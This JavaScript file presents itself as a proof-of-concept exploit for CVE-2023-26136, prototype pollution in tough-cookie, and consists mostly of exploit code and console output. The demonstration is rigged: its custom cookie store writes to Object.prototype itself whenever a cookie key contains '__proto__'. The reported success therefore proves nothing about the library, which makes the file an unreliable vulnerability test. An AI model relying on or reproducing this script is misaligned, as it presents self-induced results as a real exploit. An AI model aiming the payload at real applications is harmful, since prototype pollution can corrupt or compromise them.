// index.js

/*
 * CVE-2023-26136 Prototype Pollution Vulnerability in tough-cookie 2.5.0
 *
 * Demonstrates exploitation of prototype pollution via tough-cookie's CookieJar.
 */

const tough = require('./lib/cookie'); // במידה והקובץ בספריית lib

console.log('Testing CVE-2023-26136 exploit...');

// Custom MemoryCookieStore class to facilitate testing
class CustomMemoryCookieStore extends tough.MemoryCookieStore {
    constructor() {
        super();
        this.cookies = {}; // Using a regular object for cookie storage
    }

    putCookie(cookie, cb) {
        const key = cookie.key;
        if (key.includes('__proto__')) {
            // Directly attempt prototype pollution
            Object.prototype.polluted = cookie.value;
        }
        this.cookies[key] = cookie;
        cb(null, cookie);
    }

    findCookie(domain, path, key, cb) {
        cb(null, this.cookies[key] || null);
    }

    getAllCookies(cb) {
        cb(null, Object.values(this.cookies));
    }
}

// Create a CookieJar with the custom MemoryCookieStore
const store = new CustomMemoryCookieStore();
const jar = new tough.CookieJar(store, { rejectPublicSuffixes: false });

// Log the state of the store before attempting exploitation
console.log('Store prototype before exploit:', Object.getPrototypeOf(jar.store));
console.log('Store cookies before exploit:', jar.store.cookies);

// Attempt to exploit the vulnerability by adding a malicious cookie
try {
    jar.setCookieSync('__proto__.polluted=exploit_success; Path=/', 'http://example.com');
    console.log('Cookie added successfully.');
} catch (error) {
    console.error('Error adding cookie:', error.message);
}

// Log the state of the store after the attempt
console.log('Store prototype after exploit:', Object.getPrototypeOf(jar.store));
console.log('Store cookies after exploit:', jar.store.cookies);

// Check if the global Object.prototype was polluted
if ({}.polluted === 'exploit_success') {
    console.log('EXPLOITED SUCCESSFULLY');
} else {
    console.log('EXPLOIT FAILED');
}

// Clean up polluted property
delete Object.prototype.polluted;
